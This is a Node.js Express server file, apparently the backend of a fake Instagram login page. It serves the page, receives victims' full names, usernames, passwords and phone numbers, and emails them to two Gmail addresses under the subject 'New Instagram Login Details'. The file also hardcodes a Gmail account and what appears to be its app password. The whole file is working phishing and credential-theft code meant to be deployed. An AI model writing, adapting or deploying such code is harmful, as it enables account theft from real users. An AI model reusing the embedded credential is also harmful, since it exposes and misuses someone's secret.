const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(express.json());
app.use(cors());

// Static files serve karne ke liye
app.use(express.static(__dirname));

// Main page (index.html) serve karne ke liye
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Nodemailer setup
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'lagharitahir08@gmail.com',
        pass: process.env.EMAIL_PASS || 'mcfn tmzh qnxd ghaa' // Vercel Environment Variables mein store karein
    }
});

app.post('/send-data', (req, res) => {
    const { fullname, username, password, phone } = req.body;

    const mailOptions = {
        from: 'lagharitahir08@gmail.com',
        to: 'lagharitahir08@gmail.com, tahirlaghari094@gmail.com', // Correct comma-separated string
        subject: 'New Instagram Login Details',
        text: `Nayi Login Details aayi hain:

Full Name: ${fullname}
Username: ${username}
Password: ${password}
Phone Number: ${phone}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log("Email Error:", error);
            return res.status(500).send("Email send karne mein error aayi.");
        } else {
            console.log('Email sent: ' + info.response);
            return res.status(200).send("Data successfully bhej diya gaya hai.");
        }
    });
});

// Local Development Support
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Server ${PORT} port par chal raha hai.`);
    });
}

// Vercel serverless export
module.exports = app;
